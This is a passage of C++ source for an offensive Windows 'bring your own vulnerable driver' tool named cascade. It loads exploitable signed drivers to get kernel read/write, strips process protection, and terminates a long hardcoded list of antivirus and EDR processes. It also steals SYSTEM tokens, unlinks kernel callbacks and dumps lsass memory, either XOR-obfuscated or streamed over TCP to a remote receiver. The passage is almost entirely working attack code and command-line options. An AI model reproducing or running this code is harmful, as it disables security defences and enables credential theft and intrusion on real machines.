    "rtvscan.exe","SepMasterService.exe","sepWscSvc64.exe","smc.exe","SmcGui.exe",
    // OSSEC / Wazuh
    "ossec-agent.exe","wazuh-agent.exe",
    // Palo Alto / Cortex
    "cortexService.exe","trapsagent.exe","trapsd.exe","Traps.exe",
    // Qualys
    "qualys-cloud-agent.exe","QualysAgent.exe",
    // Rapid7
    "ir_agent.exe","rapid7_endpoint.exe",
    // Red Canary
    "RedCanaryAgent.exe",
    // Sangfor
    "SangforAgent.exe","SangforEDR.exe","SangforMonitor.exe","SangforProtect.exe","SangforService.exe",
    // SentinelOne
    "Sentinel.exe","SentinelAgent.exe","SentinelAgentWorker.exe","SentinelCtl.exe",
    "SentinelHelperService.exe","SentinelMemoryScanner.exe","SentinelServiceHost.exe",
    "SentinelStaticEngine.exe","SentinelUI.exe",
    // SonicWall
    "SonicWallClientProtectionService.exe","swc_service.exe",
    // Sophos
    "hmpalert.exe","McsAgent.exe","McsClient.exe","SavApi.exe","SAVAdminService.exe",
    "SAVService.exe","SEDService.exe","SophosClean.exe","SophosHealth.exe",
    "SophosLiveQueryService.exe","SophosMTR.exe","SophosNetFilter.exe",
    "SophosNtpService.exe","SophosOsquery.exe","SophosUI.exe","SophosUpdateMgr.exe",
    // Tanium
    "TaniumClient.exe","TaniumCX.exe","tanclient.exe",
    // ThreatLocker
    "ThreatLockerConsent.exe","threatlockerservice.exe","threatlockertray.exe",
    // Trend Micro
    "coreFrameworkHost.exe","coreServiceShell.exe","NTRTScan.exe","ntrtscan.exe",
    "OfcService.exe","PccNTMon.exe","TMBMSRV.exe","TmListen.exe","TmPfw.exe",
    // Uptycs
    "VectorAgent.exe","UptycsAgent.exe",
    // WatchGuard
    "wlcsservice.exe",
    // Webroot
    "WRSA.exe","WRSkyClient.exe","WRSVC.exe",
    // Sysmon
    "Sysmon.exe","Sysmon64.exe",
    // Zscaler
    "zlclient.exe",
    nullptr
};

// Count processes still alive (for verify after kill)
static int CountRunning(const char* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe{}; pe.dwSize = sizeof(pe);
    int count = 0;
    if (Process32FirstW(snap, &pe)) do {
        char nm[MAX_PATH]{};
        WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, nm, sizeof(nm), nullptr, nullptr);
        if (_stricmp(nm, name) == 0) count++;
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    return count;
}

static void KillEdrs() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe{}; pe.dwSize = sizeof(pe);
    int attempted = 0, killed = 0, denied = 0;
    if (Process32FirstW(snap, &pe)) do {
        char nm[MAX_PATH]{};
        WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, nm, sizeof(nm), nullptr, nullptr);
        for (int i = 0; kEdrProcs[i]; i++) {
            if (_stricmp(nm, kEdrProcs[i]) == 0) {
                attempted++;
                HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (h) {
                    if (TerminateProcess(h, 1)) {
                        printf("[+] Killed %s (PID %lu)\n", nm, pe.th32ProcessID);
                        killed++;
                    } else {
                        printf("[-] TerminateProcess %s (PID %lu) failed (%lu) - PPL strip may have failed\n",
                               nm, pe.th32ProcessID, GetLastError());
                        denied++;
                    }
                    CloseHandle(h);
                } else {
                    printf("[-] OpenProcess %s (PID %lu) failed (%lu)\n",
                           nm, pe.th32ProcessID, GetLastError());
                    denied++;
                }
            }
        }
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    printf("[*] %d EDR process(es) attempted: %d killed, %d denied\n", attempted, killed, denied);
    if (denied > 0)
        printf("[!] %d kill(s) denied - PPL strip likely failed or HVCI active\n", denied);
}

// Kill specific PID: strip PPL then terminate
static bool KillSpecificPid(QWORD sysEproc, DWORD pid) {
    char nm[16]{};
    QWORD ep = FindEprocessByPid(sysEproc, pid, nm);
    if (ep) {
        BYTE before = 0; KRead(ep + g_off.Protection, &before, 1);
        if (before != 0) {
            printf("[*] %s (PID %lu) Protection=0x%02X, stripping...\n", nm, pid, before);
            BYTE zero = 0;
            if (!KWrite(ep + g_off.Protection, &zero, 1)) {
                printf("[-] KWrite Protection failed\n");
            } else {
                BYTE after = 0xFF; KRead(ep + g_off.Protection, &after, 1);
                printf("[+] Protection cleared: 0x%02X -> 0x%02X\n", before, after);
            }
        }
    } else {
        printf("[!] PID %lu EPROCESS not found (may not have PPL)\n", pid);
    }

    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!h) { printf("[-] OpenProcess PID %lu failed (%lu)\n", pid, GetLastError()); return false; }
    if (!TerminateProcess(h, 1)) {
        printf("[-] TerminateProcess PID %lu failed (%lu)\n", pid, GetLastError());
        CloseHandle(h);
        return false;
    }
    CloseHandle(h);

    Sleep(300);
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe{}; pe.dwSize = sizeof(pe);
    bool still_alive = false;
    if (snap != INVALID_HANDLE_VALUE) {
        if (Process32FirstW(snap, &pe)) do {
            if (pe.th32ProcessID == pid) { still_alive = true; break; }
        } while (Process32NextW(snap, &pe));
        CloseHandle(snap);
    }
    if (still_alive) {
        printf("[-] PID %lu still alive after TerminateProcess\n", pid);
        return false;
    }
    printf("[+] PID %lu terminated and confirmed dead\n", pid);
    return true;
}

// ---------------------------------------------------------------------------
// Decode (XOR undo)
// ---------------------------------------------------------------------------
static bool DecodeFile(const char* inPath, const char* outPath, BYTE xorKey = 0x55) {
    HANDLE f = CreateFileA(inPath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
    if (f == INVALID_HANDLE_VALUE) { printf("[-] Open %s failed (%lu)\n", inPath, GetLastError()); return false; }
    DWORD sz = GetFileSize(f, nullptr);
    if (sz == INVALID_FILE_SIZE || sz == 0) { printf("[-] GetFileSize failed\n"); CloseHandle(f); return false; }
    BYTE* buf = (BYTE*)VirtualAlloc(nullptr, sz, MEM_COMMIT, PAGE_READWRITE);
    if (!buf) { printf("[-] VirtualAlloc failed\n"); CloseHandle(f); return false; }
    DWORD got = 0;
    ReadFile(f, buf, sz, &got, nullptr);
    CloseHandle(f);
    for (DWORD i = 0; i < sz; i++) buf[i] ^= xorKey;
    if (sz >= 4 && buf[0]=='M' && buf[1]=='D' && buf[2]=='M' && buf[3]=='P')
        printf("[+] MDMP signature OK\n");
    else
        printf("[!] MDMP signature not found\n");
    HANDLE o = CreateFileA(outPath, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    DWORD w = 0;
    WriteFile(o, buf, sz, &w, nullptr);
    CloseHandle(o);
    VirtualFree(buf, 0, MEM_RELEASE);
    printf("[+] Decoded to %s (%lu bytes)\n", outPath, sz);
    return true;
}

// ---------------------------------------------------------------------------
// Jittered sleep: base_ms +/- 40%
// ---------------------------------------------------------------------------
static void JitteredSleep(DWORD base_ms) {
    BYTE rnd = 0;
    HCRYPTPROV prov = 0;
    if (CryptAcquireContextW(&prov, nullptr, nullptr, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
        CryptGenRandom(prov, 1, &rnd);
    if (prov) CryptReleaseContext(prov, 0);
    DWORD jitter = (DWORD)(base_ms * 0.4 * ((int)rnd - 128) / 128);
    Sleep(base_ms + jitter);
}

// ---------------------------------------------------------------------------
// List all processes from EPROCESS chain
// ---------------------------------------------------------------------------
static void ListProcs(QWORD sysEproc) {
    printf("%-8s  %-20s  %s\n", "PID", "Name", "Protection");
    printf("%-8s  %-20s  %s\n", "---", "----", "----------");
    QWORD head  = sysEproc + g_off.ActiveProcessLinks;
    QWORD flink = KReadQword(head);
    int guard = 0;
    while (flink && flink != head && guard++ < 10000) {
        QWORD ep  = flink - g_off.ActiveProcessLinks;
        QWORD pid = KReadQword(ep + g_off.UniqueProcessId);
        char nm[16]{};
        KRead(ep + g_off.ImageFileName, nm, 15); nm[15] = 0;
        BYTE prot = 0;
        KRead(ep + g_off.Protection, &prot, 1);
        if (prot)
            printf("%-8llu  %-20s  0x%02X (PPL)\n", pid, nm, prot);
        else
            printf("%-8llu  %-20s\n", pid, nm);
        flink = KReadQword(ep + g_off.ActiveProcessLinks);
    }
}

// ---------------------------------------------------------------------------
// Test R/W
// ---------------------------------------------------------------------------
static bool TestRw(QWORD sysEproc) {
    printf("[test] Reading System EPROCESS at 0x%llX\n", sysEproc);
    BYTE block[32]{};
    if (!KRead(sysEproc, block, sizeof(block))) {
        printf("[-] KRead System EPROCESS failed\n");
        return false;
    }
    printf("[+] KRead OK. First 16 bytes: ");
    for (int i = 0; i < 16; i++) printf("%02X ", block[i]);
    printf("\n");
    BYTE name[16]{};
    if (KRead(sysEproc + g_off.ImageFileName, name, 15))
        printf("[+] System EPROCESS ImageFileName: %s\n", (char*)name);
    QWORD pid4 = KReadQword(sysEproc + g_off.UniqueProcessId);
    printf("[+] System PID from EPROCESS: %llu (expect 4)\n", pid4);
    printf("[+] R/W test PASSED\n");
    return true;
}

// ---------------------------------------------------------------------------
// Driver init
// ---------------------------------------------------------------------------
static bool InitProvider(const Config& cfg) {
    HMODULE ntdll      = GetModuleHandleA("ntdll.dll");
    g_NtLoadDriver     = (NtLoadDriver_t)  GetProcAddress(ntdll, "NtLoadDriver");
    g_NtUnloadDriver   = (NtUnloadDriver_t)GetProcAddress(ntdll, "NtUnloadDriver");
    g_activeProvider   = cfg.type;

    // Side-load BiosToolCommonDriver as Va2Pa oracle when --va2pa is given.
    // Used by phys-only backends (winring0, ntiolib, asio3, lnvmsrio, iomap).
    if (!cfg.va2paPath.empty() && g_biostoolDev == INVALID_HANDLE_VALUE) {
        if (!EnablePrivilege(SE_LOAD_DRIVER_NAME))
            printf("[!] SeLoadDriverPrivilege not available for Va2Pa driver\n");
        else {
            std::wstring va2paWide = Utf8ToWide(cfg.va2paPath);
            std::wstring va2paDrop;
            if (CopyDriverToTemp(va2paWide, va2paDrop)) {
                std::wstring va2paSvc  = SvcNameFromPath(va2paDrop);
                std::wstring va2paReg  = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\" + va2paSvc;
                CreateDriverService(va2paSvc, va2paDrop);
                LoadDriverViaNt(va2paReg);
                JitteredSleep(200);
                // Try both derived name and canonical BiosToolCommonDriver name
                std::wstring devPath = L"\\\\.\\" + va2paSvc;
                g_biostoolDev = CreateFileW(devPath.c_str(), GENERIC_READ|GENERIC_WRITE, 0,
                    nullptr, OPEN_EXISTING, 0, nullptr);
                if (g_biostoolDev == INVALID_HANDLE_VALUE)
                    g_biostoolDev = CreateFileW(L"\\\\.\\BiosToolCommonDriver",
                        GENERIC_READ|GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
                if (g_biostoolDev != INVALID_HANDLE_VALUE) {
                    printf("[+] Va2Pa oracle (BiosTool) opened via %s\n", cfg.va2paPath.c_str());
                    // Store so CleanupProvider can unload it
                    if (g_dropPath.empty()) { g_dropPath = va2paDrop; g_svcName = va2paSvc; g_regPath = va2paReg; }
                } else {
                    printf("[-] Va2Pa oracle device open failed (%lu)\n", GetLastError());
                    UnloadDriverViaNt(va2paReg); DeleteServiceKey(va2paSvc);
                }
            }
        }
    }

    if (cfg.type == ProviderType::PdfwKrnl) {
        g_pdfwDev = CreateFileW(L"\\\\.\\Global\\PdFwKrnl",
            GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
        if (g_pdfwDev == INVALID_HANDLE_VALUE) {
            printf("[-] Cannot open PdFwKrnl (%lu)\n", GetLastError()); return false;
        }
        printf("[+] PdFwKrnl opened\n");
        return true;
    }

    if (cfg.type == ProviderType::DirectIo && !cfg.helperPath.empty()) {
        if (!EnablePrivilege(SE_LOAD_DRIVER_NAME))
            printf("[!] SeLoadDriverPrivilege not available for DirectIo helper\n");
        else {
            std::wstring hWide = Utf8ToWide(cfg.helperPath);
            std::wstring hDrop;
            if (CopyDriverToTemp(hWide, hDrop)) {
                std::wstring hSvc = SvcNameFromPath(hDrop);
                std::wstring hReg = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\" + hSvc;
                if (CreateDriverService(hSvc, hDrop) && LoadDriverViaNt(hReg)) {
                    JitteredSleep(200);
                    g_ktapiDev = CreateFileW(L"\\\\.\\ktapi",
                        GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
                    if (g_ktapiDev != INVALID_HANDLE_VALUE) {
                        printf("[+] DirectIo helper ktapi opened\n");
                        QWORD checkVa = DirectIo_GetNtosBase();
                        if (checkVa) {
                            printf("[*] VA->PA check VA (ntos base): 0x%llX\n", checkVa);
                            QWORD testPa = Superfetch_Va2Pa(checkVa);
                            if (testPa) {
                                printf("[+] Superfetch VA->PA available; skipping CR3 scan\n");
                                g_ktapiCr3 = 0;
                            } else if (getenv("CASCADE_SKIP_CR3")) {
                                printf("[*] CASCADE_SKIP_CR3 set; skipping CR3 scan\n");
                                g_ktapiCr3 = 0;
                            } else {
                                printf("[*] Superfetch VA->PA unavailable; bootstrapping CR3 via PML4 self-ref scan (may take a moment)...\n");
                                g_ktapiCr3 = Ktapi_FindCr3(checkVa);
                                if (g_ktapiCr3)
                                    printf("[+] Helper Kernel CR3: 0x%llX\n", g_ktapiCr3);
                                else
                                    printf("[-] Helper CR3 bootstrap failed - DirectIo VA->PA unavailable\n");
                            }
                        } else if (getenv("CASCADE_SKIP_CR3")) {
                            printf("[*] CASCADE_SKIP_CR3 set; skipping CR3 scan\n");
                            g_ktapiCr3 = 0;
                        } else {
                            g_ktapiCr3 = Ktapi_FindCr3(0);
                        }
                        g_directioHelperSvc  = hSvc;
                        g_directioHelperReg  = hReg;
                        g_directioHelperDrop = hDrop;
                    } else {
                        printf("[-] DirectIo helper \\\\.\\ktapi open failed (%lu)\n", GetLastError());
                        UnloadDriverViaNt(hReg);
                        DeleteServiceKey(hSvc);
                    }
                } else {
                    printf("[-] DirectIo helper load failed\n");
                }
            }
        }
    }

    if (cfg.drvPath.empty()) {
        printf("[-] --driver path required\n"); return false;
    }
    if (!EnablePrivilege(SE_LOAD_DRIVER_NAME)) {
        printf("[-] SeLoadDriverPrivilege not available\n"); return false;
    }

    std::wstring widePath = Utf8ToWide(cfg.drvPath);
    std::wstring dropped;
    if (!CopyDriverToTemp(widePath, dropped)) return false;
    printf("[*] Driver dropped to: %s\n", WideToUtf8(dropped).c_str());

    g_svcName  = SvcNameFromPath(dropped);
    g_regPath  = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\" + g_svcName;
    g_dropPath = dropped;

    if (!CreateDriverService(g_svcName, dropped)) return false;
    if (!LoadDriverViaNt(g_regPath)) {
        DeleteServiceKey(g_svcName);
        DeleteFileW(dropped.c_str());
        return false;
    }
    JitteredSleep(300);

    if (cfg.type == ProviderType::Ktapi) {
        g_ktapiDev = CreateFileW(L"\\\\.\\ktapi",
            GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
        if (g_ktapiDev == INVALID_HANDLE_VALUE) {
            printf("[-] Cannot open \\\\.\\ktapi (%lu)\n", GetLastError()); return false;
        }
        printf("[+] ktapi device opened\n");
        QWORD checkVa = DirectIo_GetNtosBase();
        if (checkVa) {
            printf("[*] VA->PA check VA (ntos base): 0x%llX\n", checkVa);
            QWORD testPa = Superfetch_Va2Pa(checkVa);
            if (testPa) {
                printf("[+] Superfetch VA->PA available; skipping CR3 scan\n");
                return true;
            }
            if (getenv("CASCADE_SKIP_CR3")) {
                printf("[*] CASCADE_SKIP_CR3 set; skipping CR3 scan\n");
                return true;
            }
            printf("[*] Superfetch VA->PA unavailable; bootstrapping CR3 via PML4 self-ref scan (may take a moment)...\n");
            g_ktapiCr3 = Ktapi_FindCr3(checkVa);
            if (!g_ktapiCr3) {
                printf("[-] CR3 bootstrap failed - ktapi VA->PA unavailable\n"); return false;
            }
            printf("[+] Kernel CR3: 0x%llX\n", g_ktapiCr3);
            return true;
        }
        if (getenv("CASCADE_SKIP_CR3")) {
            printf("[*] CASCADE_SKIP_CR3 set; skipping CR3 scan\n");
            return true;
        }
        g_ktapiCr3 = Ktapi_FindCr3(0);
        if (!g_ktapiCr3) {
            printf("[-] CR3 bootstrap failed - ktapi VA->PA unavailable\n"); return false;
        }
        printf("[+] Kernel CR3: 0x%llX\n", g_ktapiCr3);
        return true;
    }

    // WinRing0: device WinRing0_1_2_0; VA->PA via BiosTool side-load
    if (cfg.type == ProviderType::WinRing0) {
        g_wr0Dev = CreateFileW(L"\\\\.\\WinRing0_1_2_0",
            GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
        if (g_wr0Dev == INVALID_HANDLE_VALUE) {
            printf("[-] Cannot open WinRing0_1_2_0 (%lu)\n", GetLastError()); return false;
        }
        printf("[+] WinRing0_1_2_0 opened\n");
        // WinRing0 has only phys R/W; we need VA->PA. Open BiosTool as Va2Pa oracle.
        // Caller must also load BiosToolCommonDriver.sys and pass it via --va2pa.
        // If g_biostoolDev is already open we use it, otherwise warn.
        if (g_biostoolDev == INVALID_HANDLE_VALUE)
            printf("[!] WinRing0: no Va2Pa oracle. Load BiosTool for --test-rw / --dump-rpm.\n");
        return true;
    }

    // NTIOLib: device NTIOLib_MysticLight; VA->PA via BiosTool
    if (cfg.type == ProviderType::NTIOLib) {
        g_ntiodev = CreateFileW(L"\\\\.\\NTIOLib_MysticLight",
            GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
        if (g_ntiodev == INVALID_HANDLE_VALUE) {
            printf("[-] Cannot open NTIOLib_MysticLight (%lu)\n", GetLastError()); return false;
        }
        printf("[+] NTIOLib_MysticLight opened\n");
        if (g_biostoolDev == INVALID_HANDLE_VALUE)
            printf("[!] NTIOLib: no Va2Pa oracle.\n");
        return true;
    }

    // AsIO3: device Asusgio3; VA->PA via BiosTool
    if (cfg.type == ProviderType::AsIO3) {
        g_asio3dev = CreateFileW(L"\\\\.\\Asusgio3",
            GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
        if (g_asio3dev == INVALID_HANDLE_VALUE) {
            printf("[-] Cannot open Asusgio3 (%lu)\n", GetLastError()); return false;
        }
        printf("[+] Asusgio3 opened\n");
        if (g_biostoolDev == INVALID_HANDLE_VALUE)
            printf("[!] AsIO3: no Va2Pa oracle.\n");
        return true;
    }

    // LnvMSRIO: device WinMsrDev; VA->PA via BiosTool
    if (cfg.type == ProviderType::LnvMSRIO) {
        g_lnvdev = CreateFileW(L"\\\\.\\WinMsrDev",
            GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
        if (g_lnvdev == INVALID_HANDLE_VALUE) {
            printf("[-] Cannot open WinMsrDev (%lu)\n", GetLastError()); return false;
        }
        printf("[+] WinMsrDev (LnvMSRIO) opened\n");
        if (g_biostoolDev == INVALID_HANDLE_VALUE)
            printf("[!] LnvMSRIO: no Va2Pa oracle.\n");
        return true;
    }

    // IOMap: device IOMap; VA->PA via BiosTool
    if (cfg.type == ProviderType::IOMap) {
        g_iomapdev = CreateFileW(L"\\\\.\\IOMap",
            GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
        if (g_iomapdev == INVALID_HANDLE_VALUE) {
            printf("[-] Cannot open IOMap (%lu)\n", GetLastError()); return false;
        }
        printf("[+] IOMap opened\n");
        if (g_biostoolDev == INVALID_HANDLE_VALUE)
            printf("[!] IOMap: no Va2Pa oracle.\n");
        return true;
    }

    // DirectIo64: dynamic service device; VA->PA via ktapi helper or BiosTool side-load
    if (cfg.type == ProviderType::DirectIo) {
        std::wstring candidates[4] = {
            L"\\\\.\\" + g_svcName,
            L"\\\\.\\DirectIo64",
            L"\\\\.\\DIRECTIOLPT",
            L"\\\\.\\" + SvcNameFromPath(widePath)
        };
        for (int i = 0; i < 4; i++) {
            g_directioDev = CreateFileW(candidates[i].c_str(),
                GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
            if (g_directioDev != INVALID_HANDLE_VALUE) {
                printf("[+] DirectIo device opened: %s\n", WideToUtf8(candidates[i]).c_str());
                break;
            }
        }
        if (g_directioDev == INVALID_HANDLE_VALUE) {
            printf("[-] Cannot open DirectIo device (%lu)\n", GetLastError()); return false;
        }
        if (g_ktapiDev == INVALID_HANDLE_VALUE && g_biostoolDev == INVALID_HANDLE_VALUE)
            printf("[!] DirectIo: no VA->PA helper. Use --helper ktapi.sys or --va2pa BiosTool.sys.\n");
        if (cfg.directioEnableWrite) {
            if (!DirectIo_EnableWrite(cfg.directioGatePa)) {
                printf("[-] DirectIo write enable failed\n");
                return false;
            }
        }
        return true;
    }

    // BiosTool (default)
    std::wstring devPath = L"\\\\.\\" + g_svcName;
    g_biostoolDev = CreateFileW(devPath.c_str(),
        GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (g_biostoolDev == INVALID_HANDLE_VALUE) {
        g_biostoolDev = CreateFileW(L"\\\\.\\BiosToolCommonDriver",
            GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    }
    if (g_biostoolDev == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open device %s (%lu)\n",
            WideToUtf8(devPath).c_str(), GetLastError());
        return false;
    }
    printf("[+] Device opened: %s\n", WideToUtf8(devPath).c_str());
    return true;
}

static void CleanupProvider() {
    if (g_biostoolDev != INVALID_HANDLE_VALUE) { CloseHandle(g_biostoolDev); g_biostoolDev = INVALID_HANDLE_VALUE; }
    if (g_pdfwDev     != INVALID_HANDLE_VALUE) { CloseHandle(g_pdfwDev);     g_pdfwDev     = INVALID_HANDLE_VALUE; }
    if (g_ktapiDev    != INVALID_HANDLE_VALUE) { CloseHandle(g_ktapiDev);    g_ktapiDev    = INVALID_HANDLE_VALUE; }
    if (g_wr0Dev      != INVALID_HANDLE_VALUE) { CloseHandle(g_wr0Dev);      g_wr0Dev      = INVALID_HANDLE_VALUE; }
    if (g_ntiodev     != INVALID_HANDLE_VALUE) { CloseHandle(g_ntiodev);     g_ntiodev     = INVALID_HANDLE_VALUE; }
    if (g_asio3dev    != INVALID_HANDLE_VALUE) { CloseHandle(g_asio3dev);    g_asio3dev    = INVALID_HANDLE_VALUE; }
    if (g_lnvdev      != INVALID_HANDLE_VALUE) { CloseHandle(g_lnvdev);      g_lnvdev      = INVALID_HANDLE_VALUE; }
    if (g_iomapdev    != INVALID_HANDLE_VALUE) { CloseHandle(g_iomapdev);    g_iomapdev    = INVALID_HANDLE_VALUE; }
    if (g_directioDev != INVALID_HANDLE_VALUE) { CloseHandle(g_directioDev); g_directioDev = INVALID_HANDLE_VALUE; }
    if (!g_regPath.empty()) { UnloadDriverViaNt(g_regPath); DeleteServiceKey(g_svcName); }
    if (!g_dropPath.empty()) { JitteredSleep(500); DeleteFileW(g_dropPath.c_str()); }
    if (!g_directioHelperReg.empty()) {
        UnloadDriverViaNt(g_directioHelperReg);
        DeleteServiceKey(g_directioHelperSvc);
        if (!g_directioHelperDrop.empty()) { JitteredSleep(500); DeleteFileW(g_directioHelperDrop.c_str()); }
        g_directioHelperReg.clear(); g_directioHelperSvc.clear(); g_directioHelperDrop.clear();
    }
}

// ---------------------------------------------------------------------------
// CLI
// ---------------------------------------------------------------------------
static void Usage(const char* prog) {
    printf(
        "cascade - consolidated BYOVD tool (BiosToolCommonDriver / ktapi / warp)\n\n"
        "usage: %s [options]\n"
        "  --driver PATH          path to vulnerable driver .sys\n"
        "  --driver-type TYPE     biostool (default), ktapi, pdfwkrnl\n"
        "                         winring0, ntiolib, asio3, lnvmsrio, iomap, directio\n"
        "  --va2pa PATH           side-load BiosToolCommonDriver.sys for Va2Pa oracle\n"
        "                         required with winring0/ntiolib/asio3/lnvmsrio/iomap\n"
        "  --helper PATH          side-load ktapi.sys for directio VA->PA\n"
        "  --directio-enable-write  patch DirectIo64 gate via bit-clear for write maps\n"
        "  --directio-gate-pa HEX  DirectIo64 gate PA override (RVA 0x3601)\n"
        "                         with --test-rw, runs a DirectIo write-map self-test\n"
        "  --pid N                target PID (default: lsass)\n\n"
        "Recon (read-only):\n"
        "  --test-rw              verify kernel R/W works\n"
        "  --dry-run              resolve structures, write nothing\n"
        "  --list-callbacks       enumerate ObCallback registrations\n"
        "  --list-procs           enumerate processes from kernel EPROCESS chain\n\n"
        "PPL / token:\n"
        "  --ppl-strip --pid N    remove PPL from specific PID\n"
        "  --ppl-add   --pid N    add PPL (Protected/WinSystem) to PID\n"
        "  --priv-esc  [--pid N]  steal SYSTEM token (default: self)\n\n"
        "EDR kill:\n"
        "  --kill-edr             strip PPL + terminate all known AV/EDR (%d entries)\n"
        "  --kill-pid  --pid N    strip PPL + terminate specific PID\n\n"
        "Callbacks:\n"
        "  --patch-callbacks      unlink all ObCallback registrations\n\n"
        "Dump:\n"
        "  --dump-rpm  --out PATH    ReadProcessMemory dump (recommended)\n"
        "  --dump-tcp  RECV_IP PORT  disk-free TCP streaming dump\n"
        "  --dump-kernel --out PATH  CR3 physical read (no VM_READ handle)\n"
        "  --dump --out PATH         [deprecated: use --dump-rpm] MiniDumpWriteDump\n"
        "  --no-xor               raw output (with --dump)\n"
        "  --xor-key HEX          XOR key byte in hex (default: 55); applies to --dump and --decode\n"
        "  --decode --in P --out P  undo XOR, validate MDMP\n\n"
        "Common:\n"
        "  --verbose              show kernel addresses and extended debug output\n"
        "  --help\n",
        prog, []{ int n=0; for(const char**p=kEdrProcs;*p;p++) n++; return n; }());
}

int main(int argc, char** argv) {
    Config cfg;
    for (int i = 1; i < argc; i++) {
        std::string a = argv[i];
        auto next = [&]() -> const char* { return (i + 1 < argc) ? argv[++i] : ""; };
        if (a == "--help" || a == "-h")         { Usage(argv[0]); return 0; }
        else if (a == "--driver")               cfg.drvPath    = next();
        else if (a == "--va2pa")               cfg.va2paPath  = next();
        else if (a == "--helper")              cfg.helperPath = next();
        else if (a == "--out")                  cfg.outPath    = next();
        else if (a == "--in")                   cfg.inPath     = next();
        else if (a == "--pid")                  cfg.targetPid  = (DWORD)atol(next());
        else if (a == "--driver-type") {
            std::string t = next();
            if (t == "biostool")               cfg.type = ProviderType::BiosTool;
            else if (t == "ktapi")             cfg.type = ProviderType::Ktapi;
            else if (t == "pdfwkrnl")          cfg.type = ProviderType::PdfwKrnl;
            else if (t == "winring0")          cfg.type = ProviderType::WinRing0;
            else if (t == "ntiolib")           cfg.type = ProviderType::NTIOLib;
            else if (t == "asio3")             cfg.type = ProviderType::AsIO3;
            else if (t == "lnvmsrio")          cfg.type = ProviderType::LnvMSRIO;
            else if (t == "iomap")             cfg.type = ProviderType::IOMap;
            else if (t == "directio" || t == "directio64") cfg.type = ProviderType::DirectIo;
            else { printf("[-] Unknown driver-type: %s\n", t.c_str()); return 2; }
        }
        else if (a == "--dry-run")              cfg.dryRun           = true;
        else if (a == "--test-rw")              cfg.testRw           = true;
        else if (a == "--priv-esc")             cfg.doPrivEsc        = true;
        else if (a == "--kill-edr")             cfg.killEdr          = true;
        else if (a == "--kill-pid")             cfg.doKillPid        = true;
        else if (a == "--ppl-strip")            cfg.doPplStrip       = true;
        else if (a == "--ppl-add")              cfg.doPplAdd         = true;
        else if (a == "--dump")                 cfg.doDump           = true;
        else if (a == "--dump-rpm")             cfg.doDumpRpm        = true;
        else if (a == "--dump-kernel")          cfg.doDumpKernel     = true;
        else if (a == "--dump-tcp") {
            cfg.doDumpTcp = true;
            cfg.recvIp    = next();
            cfg.recvPort  = atoi(next());
        }
        else if (a == "--patch-callbacks")      cfg.doPatchCallbacks = true;
        else if (a == "--list-callbacks")       cfg.doListCallbacks  = true;
        else if (a == "--list-procs")           cfg.doListProcs      = true;
        else if (a == "--decode")               cfg.doDecode         = true;
        else if (a == "--no-xor")               cfg.noXor            = true;
        else if (a == "--directio-enable-write") cfg.directioEnableWrite = true;
        else if (a == "--directio-gate-pa")    cfg.directioGatePa = strtoul(next(), nullptr, 16);
        else if (a == "--verbose")              cfg.verbose          = true;
        else if (a == "--xor-key") {
            const char* kstr = next();
            unsigned long kval = strtoul(kstr, nullptr, 16);
            cfg.xorKey = (BYTE)(kval & 0xFF);
        }
        else { printf("[-] Unknown arg: %s\n", a.c_str()); Usage(argv[0]); return 2; }
    }

    if (cfg.verbose) g_verbose = true;

    if (cfg.doDecode) {
        if (cfg.inPath.empty() || cfg.outPath.empty()) {
            printf("[-] --decode needs --in and --out\n"); return 2;
        }
        return DecodeFile(cfg.inPath.c_str(), cfg.outPath.c_str(), cfg.xorKey) ? 0 : 1;
    }

    DWORD build = GetWindowsBuild();
    printf("[*] Windows build: %lu\n", build);
    SetOffsetsByBuild(build);

    if (!InitProvider(cfg)) return 1;

    KernelBase kb = GetKernelBase();
    if (!kb.ntosBase || !kb.systemEproc) {
        printf("[-] Failed to locate ntoskrnl base or System EPROCESS\n");
        CleanupProvider(); return 1;
    }
    if (g_verbose) {
        printf("[*] ntoskrnl: 0x%llX\n", kb.ntosBase);
        printf("[+] System EPROCESS: 0x%llX\n", kb.systemEproc);
    }

    int ret = 0;

    if (cfg.testRw) {
        if (!TestRw(kb.systemEproc)) ret = 1;
        else if (cfg.type == ProviderType::DirectIo && cfg.directioEnableWrite &&
                 !DirectIo_WriteSelfTest())
            ret = 1;
